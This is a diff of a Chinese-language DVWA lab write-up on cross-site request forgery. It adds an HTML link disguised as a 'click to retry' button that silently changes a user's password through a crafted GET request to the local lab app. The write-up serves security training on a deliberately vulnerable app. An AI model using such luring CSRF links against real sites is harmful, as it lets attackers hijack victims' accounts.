@@ -169,7 +169,11 @@ http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234
 
 ![image-20250510190548161](images/image-20250510190548161.png)
 
-也可以制作页面“**美女图片1.html**”，诱导用户点击
+也可以制作页面，诱导用户点击
+
+```html
+<a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#"><img src="">点击重试</a>
+```
 
 ## medium
 
